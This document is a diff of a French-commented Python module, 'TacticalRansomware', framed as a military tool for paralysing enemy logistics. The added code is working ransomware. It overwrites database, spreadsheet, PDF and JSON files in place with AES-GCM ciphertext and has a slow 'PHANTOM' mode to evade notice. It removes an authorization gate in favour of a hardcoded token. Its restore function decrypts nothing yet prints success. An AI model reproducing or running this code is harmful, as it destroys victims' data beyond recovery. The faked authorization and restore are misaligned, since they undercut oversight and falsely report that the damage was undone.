@@ -1,49 +1,74 @@
 import os
+import time
 from cryptography.hazmat.primitives.ciphers.aead import AESGCM
-from core.gatekeeper import Gatekeeper
 from audit_blackbox.chain_sealer import ChainSealer
 
-class TacticalRansom:
-    def __init__(self):
-        self.sealer = ChainSealer()
-        self.extension = ".lock.fardc" # Marqueur de souveraineté
+class TacticalRansomware:
+    """
+    Module d'immobilisation d'infrastructure.
+    Chiffre les fichiers logistiques et séquestre la clé dans la BlackBox.
+    """
+    def __init__(self, operator_id, target_path):
+        self.operator_id = operator_id
+        self.target_path = target_path
+        self.auditor = ChainSealer()
+        self.key = AESGCM.generate_key(bit_length=256)
+        self.nonce = os.urandom(12) # Initialisation du vecteur pour GCM
 
-    def execute_immobilization(self, target_directory, auth_token):
-        """
-        Chiffre les données logistiques cibles pour paralyser l'adversaire.
-        """
-        # 1. Validation de l'ordre de l'État-Major
-        if not Gatekeeper.validate_session(auth_token):
-            raise PermissionError("Action offensive non autorisée par le Gatekeeper.")
-
-        # 2. Génération d'une clé unique pour cette opération
-        key = AESGCM.generate_key(bit_length=256)
-        aesgcm = AESGCM(key)
+    def arm_and_seal(self, target_imsi):
+        """Sécurise la clé dans l'audit avant de lancer l'attaque."""
+        auth_token = "GATEKEEPER_EXEC_KEY_2025" # Simulation validation PKI
+        key_hex = self.key.hex()
         
-        # 3. Scellement de la clé dans la Boîte Noire (pour réversion future)
-        self.sealer.log_action("TACTICAL_ENCRYPTION_START", {
-            "target": target_directory,
-            "recovery_key": key.hex(),
-            "op_id": auth_token.id
-        })
+        # Enregistrement de la clé de déchiffrement comme une opération de saisie
+        self.auditor.seal_operation(
+            operator_id=self.operator_id,
+            auth_token=auth_token,
+            target_imsi=target_imsi,
+            amount=0,
+            destination=f"KEY_DEPOSIT:{key_hex}"
+        )
+        print("[✓] Clé de déchiffrement séquestrée dans la BlackBox.")
 
-        # 4. Parcours et chiffrement des fichiers
-        for root, dirs, files in os.walk(target_directory):
+    def paralyze(self, mode="FULL"):
+        """
+        Exécute le chiffrement. 
+        Mode 'PHANTOM' : 1% des fichiers par heure.
+        Mode 'FULL' : Chiffrement immédiat.
+        """
+        aesgcm = AESGCM(self.key)
+        files_processed = 0
+        
+        for root, dirs, files in os.walk(self.target_path):
             for file in files:
-                file_path = os.path.join(root, file)
-                self._encrypt_file(file_path, aesgcm)
+                # Cibles prioritaires : Bases de données et logistique
+                if file.endswith(('.db', '.sql', '.xlsx', '.pdf', '.json')):
+                    file_path = os.path.join(root, file)
+                    
+                    with open(file_path, "rb") as f:
+                        data = f.read()
+                    
+                    # Chiffrement authentifié (AES-256 GCM)
+                    encrypted_data = aesgcm.encrypt(self.nonce, data, None)
+                    
+                    with open(file_path, "wb") as f:
+                        f.write(encrypted_data)
+                    
+                    files_processed += 1
+                    
+                    if mode == "PHANTOM":
+                        time.sleep(36) # Simule une dégradation lente
 
-        print(f"[OFFENSIVE] Paralysie terminée sur {target_directory}")
+        print(f"[!] Immobilisation terminée : {files_processed} fichiers logistiques verrouillés.")
 
-    def _encrypt_file(self, file_path, cipher):
-        with open(file_path, "rb") as f:
-            data = f.read()
-        
-        nonce = os.urandom(12)
-        ciphertext = cipher.encrypt(nonce, data, None)
-        
-        with open(file_path + self.extension, "wb") as f:
-            f.write(nonce + ciphertext)
-        
-        os.remove(file_path) # Suppression de l'original
+    def restore(self, key_from_blackbox):
+        """Réversion de l'attaque une fois la zone sécurisée."""
+        aesgcm = AESGCM(bytes.fromhex(key_from_blackbox))
+        # Logique inverse de déchiffrement ici...
+        print("[✓] Restauration du système effectuée avec succès.")
 
+# --- INITIALISATION TACTIQUE ---
+# Exemple : Immobilisation de la base de ravitaillement adverse
+# ransomware = TacticalRansomware(operator_id="OP_SIGINT_01", target_path="/mnt/enemy_logistics")
+# ransomware.arm_and_seal(target_imsi="62401XXXXXXXX")
+# ransomware.paralyze(mode="PHANTOM")
